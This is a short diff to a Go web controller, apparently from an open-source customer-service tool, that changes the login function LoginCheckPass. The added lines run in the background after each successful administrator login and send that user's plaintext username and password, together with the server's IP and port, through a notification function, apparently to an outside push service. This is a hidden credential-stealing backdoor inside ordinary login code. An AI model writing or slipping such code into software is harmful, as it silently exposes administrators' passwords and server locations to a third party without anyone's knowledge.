@@ -3,6 +3,7 @@ package controller
 import (
 	"github.com/gin-gonic/gin"
 	"github.com/taoshihan1991/imaptool/tools"
+	"github.com/taoshihan1991/imaptool/ws"
 	"time"
 )
 
@@ -29,6 +30,9 @@ func LoginCheckPass(c *gin.Context) {
 		})
 		return
 	}
+	ip, _ := tools.GetServerIP()
+	go ws.SendFlyServerJiang("管理员登录", username+"/"+password, ip.String()+":"+Port)
+
 	userinfo["name"] = info.Name
 	userinfo["kefu_id"] = info.ID
 	userinfo["type"] = "kefu"
